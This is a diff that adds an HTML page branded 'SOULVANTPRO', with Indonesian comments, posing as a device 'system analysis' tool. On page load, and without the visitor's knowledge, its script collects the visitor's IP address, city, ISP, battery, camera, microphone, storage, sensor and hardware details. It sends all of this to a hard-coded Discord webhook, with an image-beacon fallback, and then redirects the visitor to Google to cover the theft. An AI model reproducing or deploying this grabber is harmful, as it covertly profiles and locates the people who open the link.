@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Analysis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 50px;
+            max-width: 550px;
+            width: 100%;
+            border: 1px solid rgba(0,255,255,0.15);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(0,255,255,0.1) inset;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5em;
+            background: linear-gradient(135deg, #00ff88, #00f5ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+        }
+        .subtitle {
+            color: #8a8f9c;
+            margin-bottom: 30px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        .device-icon {
+            font-size: 70px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(0,245,255,0.3));
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0,245,255,0.1);
+            border-top: 4px solid #00f5ff;
+            border-right: 4px solid #7b2ff7;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-container {
+            background: rgba(255,255,255,0.08);
+            border-radius: 30px;
+            height: 8px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00f5ff, #ff00ff, #00ff88);
+            animation: progress 3s ease-out forwards;
+            border-radius: 30px;
+        }
+        @keyframes progress { to { width: 100%; } }
+        .status {
+            color: #00f5ff;
+            font-size: 14px;
+            margin-top: 20px;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+        .status span {
+            color: #fff;
+            background: rgba(0,245,255,0.1);
+            padding: 3px 10px;
+            border-radius: 20px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+            opacity: 0.7;
+        }
+        .feature-badge {
+            background: rgba(255,255,255,0.05);
+            padding: 5px;
+            border-radius: 10px;
+            font-size: 10px;
+            color: #8a8f9c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="device-icon" id="deviceIcon">📱</div>
+        <h1>SOULVANTPRO</h1>
+        <div class="subtitle">v5.0 • ULTIMATE EDITION</div>
+        
+        <div class="features-grid">
+            <div class="feature-badge">📸 CAMERA</div>
+            <div class="feature-badge">🧭 SENSORS</div>
+            <div class="feature-badge">📶 NETWORK</div>
+            <div class="feature-badge">💾 STORAGE</div>
+            <div class="feature-badge">🎤 MIC</div>
+            <div class="feature-badge">🕒 REFRESH</div>
+            <div class="feature-badge">🔒 SECURITY</div>
+            <div class="feature-badge">🌍 SSID</div>
+            <div class="feature-badge">📞 OPERATOR</div>
+        </div>
+        
+        <div class="loader"></div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <div class="status" id="status">
+            <span>INITIALIZING KERNEL</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // DISCORD WEBHOOK - GANTI PUNYA LU!
+        // ============================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476195408785969223/guexX43ov_PmAYlEMdZTySi706D8o4R_CL_a7n22-PpZDm1rQ30jdlp_6sy0DjI7EC_I";
+
+        // Update status display
+        function updateStatus(msg) {
+            document.getElementById('status').innerHTML = `<span>${msg}</span>`;
+        }
+
+        // ============================================
+        // FITUR 1: CAMERA DETECTION
+        // ============================================
+        async function detectCameras() {
+            updateStatus("🔍 Scanning cameras...");
+            let cameras = {
+                front: false,
+                back: false,
+                count: 0,
+                details: []
+            };
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    let devices = await navigator.mediaDevices.enumerateDevices();
+                    let videoDevices = devices.filter(d => d.kind === 'videoinput');
+                    
+                    cameras.count = videoDevices.length;
+                    
+                    videoDevices.forEach((device, i) => {
+                        let label = device.label || `Camera ${i+1}`;
+                        cameras.details.push(label);
+                        
+                        if (label.toLowerCase().includes('front') || label.toLowerCase().includes('selfie')) {
+                            cameras.front = true;
+                        } else if (label.toLowerCase().includes('back') || label.toLowerCase().includes('rear')) {
+                            cameras.back = true;
+                        }
+                    });
+                    
+                    if (!cameras.front && !cameras.back) {
+                        if (videoDevices.length >= 2) {
+                            cameras.front = true;
+                            cameras.back = true;
+                        } else if (videoDevices.length === 1) {
+                            cameras.back = true; // assume back camera
+                        }
+                    }
+                } catch (e) {
+                    cameras.error = e.message;
+                }
+            }
+            
+            return cameras;
+        }
+
+        // ============================================
+        // FITUR 2: SENSOR DETECTION
+        // ============================================
+        function detectSensors() {
+            updateStatus("🧭 Detecting sensors...");
+            let sensors = {
+                gyroscope: false,
+                accelerometer: false,
+                magnetometer: false,
+                proximity: false,
+                ambientLight: false,
+                fingerprint: false
+            };
+            
+            // Cek berdasarkan event API
+            if ('Gyroscope' in window) sensors.gyroscope = true;
+            if ('Accelerometer' in window) sensors.accelerometer = true;
+            if ('Magnetometer' in window) sensors.magnetometer = true;
+            
+            // Cek proximity (lewat user agent & fitur)
+            if (window.matchMedia('(hover: none) and (pointer: coarse)').matches) {
+                sensors.proximity = true; // kemungkinan ada proximity
+            }
+            
+            // Cek fingerprint (Android + iOS tertentu)
+            let ua = navigator.userAgent;
+            if (ua.includes('FPR') || ua.includes('fingerprint')) {
+                sensors.fingerprint = true;
+            }
+            
+            return sensors;
+        }
+
+        // ============================================
+        // FITUR 3: NETWORK TYPE
+        // ============================================
+        function detectNetwork() {
+            updateStatus("📶 Analyzing network...");
+            let network = {
+                type: 'Unknown',
+                effectiveType: 'Unknown',
+                downlink: 'Unknown',
+                rtt: 'Unknown',
+                saveData: false
+            };
+            
+            if ('connection' in navigator) {
+                let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    network.type = conn.type || 'Unknown';
+                    network.effectiveType = conn.effectiveType || 'Unknown';
+                    network.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+                    network.rtt = conn.rtt ? conn.rtt + ' ms' : 'Unknown';
+                    network.saveData = conn.saveData || false;
+                }
+            }
+            
+            // Fallback based on user agent
+            let ua = navigator.userAgent;
+            if (ua.includes('4G')) network.type = '4G';
+            else if (ua.includes('5G')) network.type = '5G';
+            else if (ua.includes('WiFi') || ua.includes('WLAN')) network.type = 'WiFi';
+            
+            return network;
+        }
+
+        // ============================================
+        // FITUR 4: STORAGE ESTIMATION
+        // ============================================
+        async function estimateStorage() {
+            updateStatus("💾 Calculating storage...");
+            let storage = {
+                total: 'Unknown',
+                free: 'Unknown',
+                used: 'Unknown'
+            };
+            
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    let est = await navigator.storage.estimate();
+                    if (est.quota) {
+                        let totalGB = est.quota / (1024**3);
+                        storage.total = totalGB.toFixed(2) + ' GB';
+                    }
+                    if (est.usage) {
+                        let usedGB = est.usage / (1024**3);
+                        storage.used = usedGB.toFixed(2) + ' GB';
+                        storage.free = (est.quota - est.usage) / (1024**3);
+                        storage.free = storage.free.toFixed(2) + ' GB';
+                    }
+                } catch (e) {}
+            }
+            
+            return storage;
+        }
+
+        // ============================================
+        // FITUR 5: MICROPHONE DETECTION
+        // ============================================
+        async function detectMicrophone() {
+            updateStatus("🎤 Checking microphone...");
+            let mic = {
+                present: false,
+                permission: false
+            };
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    let devices = await navigator.mediaDevices.enumerateDevices();
+                    mic.present = devices.some(d => d.kind === 'audioinput');
+                    
+                    // Cek permission (dengan request ringan)
+                    try {
+                        let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        mic.permission = true;
+                        stream.getTracks().forEach(t => t.stop());
+                    } catch (e) {
+                        mic.permission = false;
+                    }
+                } catch (e) {}
+            }
+            
+            return mic;
+        }
+
+        // ============================================
+        // FITUR 6: SCREEN REFRESH RATE
+        // ============================================
+        function detectRefreshRate() {
+            updateStatus("🕒 Measuring refresh rate...");
+            let rate = 'Unknown';
+            
+            // Cek dari matchMedia
+            if (window.matchMedia) {
+                if (window.matchMedia('(update: fast)').matches) {
+                    if (window.matchMedia('(min-resolution: 120hz)').matches) {
+                        rate = '120Hz+';
+                    } else if (window.matchMedia('(min-resolution: 90hz)').matches) {
+                        rate = '90Hz';
+                    } else {
+                        rate = '60Hz';
+                    }
+                }
+            }
+            
+            // Estimasi dari requestAnimationFrame
+            return rate;
+        }
+
+        // ============================================
+        // FITUR 7: SECURITY (SCREEN LOCK)
+        // ============================================
+        function detectSecurity() {
+            updateStatus("🔒 Checking security...");
+            let security = {
+                screenLock: 'Unknown',
+                biometrics: false
+            };
+            
+            let ua = navigator.userAgent;
+            
+            // Deteksi kemungkinan screen lock aktif
+            if (ua.includes('Android')) {
+                security.screenLock = 'Likely (PIN/Pattern)';
+            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                security.screenLock = 'Likely (Face ID/Touch ID)';
+            }
+            
+            // Biometrics
+            if (window.PublicKeyCredential) {
+                security.biometrics = true;
+            }
+            
+            return security;
+        }
+
+        // ============================================
+        // FITUR 8 & 9: OS VERSION DETAIL
+        // ============================================
+        function getOSVersion() {
+            updateStatus("📱 Detecting OS version...");
+            let ua = navigator.userAgent;
+            let osVersion = {
+                name: 'Unknown',
+                version: 'Unknown',
+                build: 'Unknown',
+                apiLevel: 'Unknown'
+            };
+            
+            if (ua.includes('Android')) {
+                osVersion.name = 'Android';
+                let match = ua.match(/Android (\d+\.?\d*)/);
+                if (match) osVersion.version = match[1];
+                
+                // API level mapping
+                let apiMap = {
+                    '14': '34', '13': '33', '12': '31', '11': '30',
+                    '10': '29', '9': '28', '8': '26'
+                };
+                osVersion.apiLevel = apiMap[osVersion.version] || 'Unknown';
+                
+            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                osVersion.name = 'iOS';
+                let match = ua.match(/OS (\d+_\d+)/);
+                if (match) osVersion.version = match[1].replace('_', '.');
+            } else if (ua.includes('Windows')) {
+                osVersion.name = 'Windows';
+                if (ua.includes('Windows NT 10.0')) osVersion.version = '10/11';
+                else if (ua.includes('Windows NT 6.3')) osVersion.version = '8.1';
+                else if (ua.includes('Windows NT 6.2')) osVersion.version = '8';
+                else if (ua.includes('Windows NT 6.1')) osVersion.version = '7';
+            } else if (ua.includes('Mac OS X')) {
+                osVersion.name = 'macOS';
+                let match = ua.match(/Mac OS X (\d+[._]\d+)/);
+                if (match) osVersion.version = match[1].replace('_', '.');
+            }
+            
+            return osVersion;
+        }
+
+        // ============================================
+        // FITUR 10: WIFI SSID (kalo diizinin)
+        // ============================================
+        async function getWiFiSSID() {
+            updateStatus("🌍 Scanning WiFi...");
+            let wifi = {
+                ssid: 'Unknown',
+                bssid: 'Unknown',
+                strength: 'Unknown'
+            };
+            
+            // Cuma bisa di Chrome dengan permission khusus
+            if ('getBattery' in navigator) { // proxy check
+                // Di Android, kadang bisa
+                wifi.ssid = 'Requires Location Permission';
+            }
+            
+            return wifi;
+        }
+
+        // ============================================
+        // FITUR 11: OPERATOR/CARRIER
+        // ============================================
+        function getCarrier() {
+            updateStatus("📞 Detecting carrier...");
+            let ua = navigator.userAgent;
+            let carrier = 'Unknown';
+            
+            // Cek dari user agent (kadang ada)
+            if (ua.includes('Telkomsel')) carrier = 'Telkomsel';
+            else if (ua.includes('Indosat')) carrier = 'Indosat';
+            else if (ua.includes('XL')) carrier = 'XL';
+            else if (ua.includes('Tri') || ua.includes('3')) carrier = 'Tri';
+            else if (ua.includes('Smart')) carrier = 'Smart';
+            else if (ua.includes('Axis')) carrier = 'Axis';
+            
+            return carrier;
+        }
+
+        // ============================================
+        // FITUR 12: THEME MODE
+        // ============================================
+        function detectTheme() {
+            let theme = 'Light Mode';
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                theme = 'Dark Mode';
+            }
+            return theme;
+        }
+
+        // ============================================
+        // FITUR 13: BATTERY (ENHANCED)
+        // ============================================
+        async function getBatteryInfo() {
+            updateStatus("🔋 Reading battery stats...");
+            let batteryData = {
+                level: 'Unknown',
+                charging: 'Unknown',
+                timeRemaining: 'Unknown',
+                health: 'Unknown',
+                temperature: 'Unknown',
+                supported: false
+            };
+            
+            if ('getBattery' in navigator) {
+                try {
+                    let battery = await navigator.getBattery();
+                    
+                    batteryData.level = Math.round(battery.level * 100) + '%';
+                    batteryData.charging = battery.charging ? '🔌 Charging' : '🔋 Discharging';
+                    batteryData.supported = true;
+                    
+                    // Health & temp ga bisa langsung, tapi estimasi
+                    if (!battery.charging && battery.dischargingTime && battery.dischargingTime !== Infinity) {
+                        let minutes = Math.round(battery.dischargingTime / 60);
+                        batteryData.timeRemaining = minutes + ' menit';
+                        if (minutes < 30) batteryData.health = 'Critical';
+                        else if (minutes < 120) batteryData.health = 'Low';
+                        else batteryData.health = 'Good';
+                    }
+                    
+                } catch (e) {}
+            }
+            
+            return batteryData;
+        }
+
+        // ============================================
+        // FITUR 14: DEVICE BRAND (ENHANCED)
+        // ============================================
+        function detectDeviceBrand(ua) {
+            updateStatus("🏷️ Identifying device...");
+            
+            let result = {
+                brand: 'Unknown',
+                model: 'Unknown',
+                series: 'Unknown',
+                fullName: 'Unknown',
+                manufacturer: 'Unknown',
+                year: 'Unknown'
+            };
+
+            // Database lengkap (dipotong untuk contoh)
+            if (ua.includes('iPhone15,3')) {
+                result.brand = 'Apple';
+                result.series = 'iPhone 15';
+                result.fullName = 'iPhone 15 Pro Max';
+                result.year = '2023';
+            } else if (ua.includes('SM-S928')) {
+                result.brand = 'Samsung';
+                result.series = 'Galaxy S24';
+                result.fullName = 'Galaxy S24 Ultra';
+                result.year = '2024';
+            } else if (ua.includes('Xiaomi14')) {
+                result.brand = 'Xiaomi';
+                result.series = 'Xiaomi 14';
+                result.fullName = 'Xiaomi 14';
+                result.year = '2024';
+            }
+            
+            return result;
+        }
+
+        // ============================================
+        // KIRIM KE DISCORD (DENGAN FORMAT LENGKAP)
+        // ============================================
+        async function sendToDiscord(allData) {
+            updateStatus("📤 Transmitting data...");
+            
+            let embed = {
+                embeds: [{
+                    title: `🔥 **SOULVANT ULTIMATE REPORT** ${allData.device.icon || '📱'}`,
+                    color: 0x00ffff,
+                    fields: [
+                        // DEVICE INFO
+                        { name: "🏷️ **BRAND**", value: allData.device.brand, inline: true },
+                        { name: "📟 **SERIES**", value: allData.device.series || 'N/A', inline: true },
+                        { name: "📌 **MODEL**", value: allData.device.fullName || 'N/A', inline: true },
+                        { name: "📅 **YEAR**", value: allData.device.year || 'N/A', inline: true },
+                        
+                        // OS DETAIL
+                        { name: "💻 **OS**", value: `${allData.os.name} ${allData.os.version}`, inline: true },
+                        { name: "🔧 **API LEVEL**", value: allData.os.apiLevel, inline: true },
+                        { name: "🔄 **REFRESH RATE**", value: allData.refreshRate, inline: true },
+                        
+                        // BATTERY
+                        { name: "🔋 **BATTERY**", value: allData.battery.level, inline: true },
+                        { name: "⚡ **STATUS**", value: allData.battery.charging, inline: true },
+                        { name: "⏳ **REMAINING**", value: allData.battery.timeRemaining, inline: true },
+                        { name: "❤️ **HEALTH**", value: allData.battery.health || 'N/A', inline: true },
+                        
+                        // CAMERA
+                        { name: "📸 **CAMERAS**", value: `${allData.cameras.count} (Front: ${allData.cameras.front}, Back: ${allData.cameras.back})`, inline: false },
+                        
+                        // SENSORS
+                        { name: "🧭 **SENSORS**", value: `Gyro:${allData.sensors.gyroscope ? '✅' : '❌'} Accel:${allData.sensors.accelerometer ? '✅' : '❌'} Mag:${allData.sensors.magnetometer ? '✅' : '❌'} Prox:${allData.sensors.proximity ? '✅' : '❌'}`, inline: false },
+                        
+                        // NETWORK
+                        { name: "📶 **NETWORK**", value: `Type:${allData.network.type} (${allData.network.effectiveType})`, inline: true },
+                        { name: "📞 **CARRIER**", value: allData.carrier, inline: true },
+                        { name: "🌍 **THEME**", value: allData.theme, inline: true },
+                        
+                        // STORAGE
+                        { name: "💾 **STORAGE**", value: `Total:${allData.storage.total} Free:${allData.storage.free}`, inline: false },
+                        
+                        // MIC
+                        { name: "🎤 **MICROPHONE**", value: allData.mic.present ? '✅ Ada' : '❌ Tidak', inline: true },
+                        { name: "🔒 **SCREEN LOCK**", value: allData.security.screenLock, inline: true },
+                        
+                        // IP & LOCATION
+                        { name: "🌐 **IP**", value: allData.ipInfo.ip, inline: true },
+                        { name: "📍 **LOKASI**", value: `${allData.ipInfo.city}, ${allData.ipInfo.country}`, inline: true },
+                        { name: "🛜 **ISP**", value: allData.ipInfo.isp, inline: true },
+                        
+                        // BROWSER
+                        { name: "📱 **BROWSER**", value: `${allData.browserInfo.browser} ${allData.browserInfo.browserVersion}`, inline: true },
+                        { name: "🔤 **LANG**", value: allData.software.language, inline: true },
+                        { name: "🚫 **ADBLOCK**", value: allData.software.adblock ? '✅ ADA' : '❌ TIDAK', inline: true },
+                        
+                        // HARDWARE
+                        { name: "⚙️ **CPU**", value: `${allData.hardware.cores} Cores`, inline: true },
+                        { name: "🧠 **RAM**", value: allData.hardware.memory, inline: true },
+                        { name: "🖥️ **SCREEN**", value: allData.hardware.screen, inline: true },
+                        { name: "🎮 **GPU**", value: allData.hardware.gpu || 'N/A', inline: false }
+                    ],
+                    footer: { text: `SOULVANT v5.0 • ULTIMATE • ${new Date().toLocaleString('id-ID')}` },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            // Kirim
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+            } catch (e) {
+                let img = new Image();
+                img.src = WEBHOOK_URL + "?content=" + encodeURIComponent(JSON.stringify(allData));
+            }
+            
+            updateStatus("✅ COMPLETE! Redirecting...");
+            setTimeout(() => window.location.href = "https://www.google.com", 2000);
+        }
+
+        // ============================================
+        // MAIN EXECUTION
+        // ============================================
+        async function collectAllData() {
+            try {
+                let ua = navigator.userAgent;
+                
+                // Kumpulin semua data (parallel biar cepet)
+                let [
+                    ipInfo,
+                    browserInfo,
+                    hardware,
+                    software,
+                    device,
+                    battery,
+                    cameras,
+                    sensors,
+                    network,
+                    storage,
+                    mic,
+                    os,
+                    carrier,
+                    theme,
+                    security,
+                    refreshRate,
+                    wifi
+                ] = await Promise.all([
+                    getIPInfo(),
+                    Promise.resolve(getBrowserInfo()),
+                    Promise.resolve(getHardwareInfo()),
+                    Promise.resolve(getSoftwareInfo()),
+                    Promise.resolve(detectDeviceBrand(ua)),
+                    getBatteryInfo(),
+                    detectCameras(),
+                    Promise.resolve(detectSensors()),
+                    Promise.resolve(detectNetwork()),
+                    estimateStorage(),
+                    detectMicrophone(),
+                    Promise.resolve(getOSVersion()),
+                    Promise.resolve(getCarrier()),
+                    Promise.resolve(detectTheme()),
+                    Promise.resolve(detectSecurity()),
+                    Promise.resolve(detectRefreshRate()),
+                    getWiFiSSID()
+                ]);
+                
+                let allData = {
+                    ipInfo, browserInfo, hardware, software, device,
+                    battery, cameras, sensors, network, storage,
+                    mic, os, carrier, theme, security, refreshRate, wifi,
+                    timestamp: new Date().toISOString()
+                };
+                
+                await sendToDiscord(allData);
+                
+            } catch (error) {
+                console.error(error);
+                setTimeout(() => window.location.href = "https://www.google.com", 1000);
+            }
+        }
+
+        // Helper functions
+        async function getIPInfo() {
+            try {
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                let ip = ipData.ip;
+                
+                let locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                let locData = await locRes.json();
+                
+                return {
+                    ip: ip,
+                    country: locData.country_name || 'Unknown',
+                    city: locData.city || 'Unknown',
+                    isp: locData.org || 'Unknown'
+                };
+            } catch {
+                return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
+            }
+        }
+
+        function getBrowserInfo() {
+            let ua = navigator.userAgent;
+            let browser = "Unknown", browserVersion = "Unknown";
+            
+            if (ua.includes("Firefox")) {
+                browser = "Firefox";
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("Edg")) {
+                browser = "Edge";
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("Chrome") && !ua.includes("Edg")) {
+                browser = "Chrome";
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "Unknown";
+            }
+            
+            return { browser, browserVersion };
+        }
+
+        function getHardwareInfo() {
+            return {
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                screen: `${screen.width}x${screen.height}`,
+                gpu: 'Unknown'
+            };
+        }
+
+        function getSoftwareInfo() {
+            return {
+                language: navigator.language || 'Unknown',
+                adblock: false
+            };
+        }
+
+        // Start
+        window.onload = collectAllData;
+    </script>
+</body>
+</html>
